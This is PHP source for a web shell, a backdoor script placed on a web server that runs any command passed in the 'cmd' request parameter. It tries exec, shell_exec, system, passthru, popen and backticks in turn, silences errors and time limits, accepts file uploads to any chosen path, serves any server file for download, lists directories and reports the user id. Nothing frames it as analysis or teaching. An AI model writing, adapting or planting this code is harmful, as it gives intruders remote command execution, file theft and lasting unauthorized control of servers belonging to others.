<?php

function compress(&$filedump)
{
    global $content_encoding;
    global $mime_type;
    if (@function_exists('gzencode'))
    {
        $content_encoding = 'x-gzip';
        $mime_type = 'application/x-gzip';
        $filedump = gzencode($filedump);
    }
    else
    {
       $mime_type = 'application/octet-stream';
    }
}


function perms($mode)
{
  if (!$GLOBALS['unix']) return 0;
  if( $mode & 0x1000 ) { $type='p'; }
  else if( $mode & 0x2000 ) { $type='c'; }
  else if( $mode & 0x4000 ) { $type='d'; }
  else if( $mode & 0x6000 ) { $type='b'; }
  else if( $mode & 0x8000 ) { $type='-'; }
  else if( $mode & 0xA000 ) { $type='l'; }
  else if( $mode & 0xC000 ) { $type='s'; }
  else $type='u';
  $owner["read"] = ($mode & 00400) ? 'r' : '-';
  $owner["write"] = ($mode & 00200) ? 'w' : '-';
  $owner["execute"] = ($mode & 00100) ? 'x' : '-';
  $group["read"] = ($mode & 00040) ? 'r' : '-';
  $group["write"] = ($mode & 00020) ? 'w' : '-';
  $group["execute"] = ($mode & 00010) ? 'x' : '-';
  $world["read"] = ($mode & 00004) ? 'r' : '-';
  $world["write"] = ($mode & 00002) ? 'w' : '-';
  $world["execute"] = ($mode & 00001) ? 'x' : '-';
  if( $mode & 0x800 ) $owner["execute"] = ($owner['execute']=='x') ? 's' : 'S';
  if( $mode & 0x400 ) $group["execute"] = ($group['execute']=='x') ? 's' : 'S';
  if( $mode & 0x200 ) $world["execute"] = ($world['execute']=='x') ? 't' : 'T';
  $s=sprintf("%1s", $type);
  $s.=sprintf("%1s%1s%1s", $owner['read'], $owner['write'], $owner['execute']);
  $s.=sprintf("%1s%1s%1s", $group['read'], $group['write'], $group['execute']);
  $s.=sprintf("%1s%1s%1s", $world['read'], $world['write'], $world['execute']);
  return trim($s);
}


function DirFilesR($dir,$types='')
{
    $files = Array();
    if(($handle = @opendir($dir)))
    {
      while (false !== ($file = @readdir($handle)))
      {
        if ($file != "." && $file != "..")
        {
          if(@is_dir($dir."/".$file))
            $files = @array_merge($files,DirFilesR($dir."/".$file,$types));
          else
          {
            $pos = @strrpos($file,".");
            $ext = @substr($file,$pos,@strlen($file)-$pos);
            if($types)
            {
              if(@in_array($ext,explode(';',$types)))
                $files[] = $dir."/".$file;
            }
            else
              $files[] = $dir."/".$file;
          }
        }
      }
      @closedir($handle);
    }
    return $files;
}


function command($cfe)
{
    $res = '';
    if(function_exists('exec'))
    {
      @exec($cfe,$res);
      $res = join("\n",$res);
    }
    elseif(function_exists('shell_exec'))
    {
      $res = @shell_exec($cfe);
    }
    elseif(function_exists('system'))
    {
      @ob_start();
      @system($cfe);
      $res = @ob_get_contents();
      @ob_end_clean();
    }
    elseif(function_exists('passthru'))
    {
      @ob_start();
      @passthru($cfe);
      $res = @ob_get_contents();
      @ob_end_clean();
    }
    elseif(@is_resource($f = @popen($cfe,"r")))
    {
      $res = "";
      while(!@feof($f)) { $res .= @fread($f,1024); }
      @pclose($f);
    } else {
      $res = `$cfe`;
    }
    return $res;
}

#####################################################################

error_reporting(0);
set_magic_quotes_runtime(0);
@set_time_limit(0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
$safe_mode = @ini_get('safe_mode');

#####################################################################
  if (!empty($HTTP_POST_FILES['userfile']['name']))
  {
    if(!empty($_REQUEST['name']))
    {
      $nfn = $_REQUEST['name'];
    } else {
      $nfn = $HTTP_POST_FILES['userfile']['name'];
    }

    if (@copy($HTTP_POST_FILES['userfile']['tmp_name'], $nfn))
    {
      echo "1\n$nfn upload ok";
    } else {
      $tmpname = $HTTP_POST_FILES['userfile']['tmp_name'];
      $cmd = "cp $tmpname $nfn 2>&1";

      echo "@copy failed. Trying $cmd\n";
      $cpres = command($cmd);
      if (empty($cpres))
      {
        echo "1\n$nfn upload ok";
      } else {
        echo "0\n$nfn upload error";
      }
    }
  }

  $res = '';
  $compress = isset($_REQUEST['compress']);

  $cfe = $_REQUEST['cmd'];
  if (isset($cfe))
  {
    $res = command($cfe);
    if ($compress) compress($res);
    echo $res;
  }


  $ffr = $_REQUEST['file'];
  if (isset($ffr))
  {
    header("Content-type: application/octet-stream");
    header("Content-disposition: attachment; filename=\"".$filename."\";");
    $res = file_get_contents($ffr);
    if (empty($res))
    {
       $res = command("cat $ffr");
    }
    if ($compress) compress($res);
    echo $res;
  }

  $dfr = $_REQUEST['dir'];
  if (isset($dfr))
  {
    $res = command("ls -la $dfr");
    if ($compress) compress($res);
    echo $res;
  }

  $dfra = $_REQUEST['dirall'];
  if (isset($dfra))
  {
    $res = command("ls -lRa $dfra");
    if ($compress) compress($res);
    echo $res;
  }

  $info = $_REQUEST['info'];
  if (isset($info))
  {
    switch ($info)
    {
      case 'id':
           $res = command("id");
           break;
      case 'pwd':
           $res = @getcwd();
           if (empty($res))
           {
               $res = command("pwd");
           }
           break;
    }
    if ($compress) compress($res);
    echo $res;
  }

?>
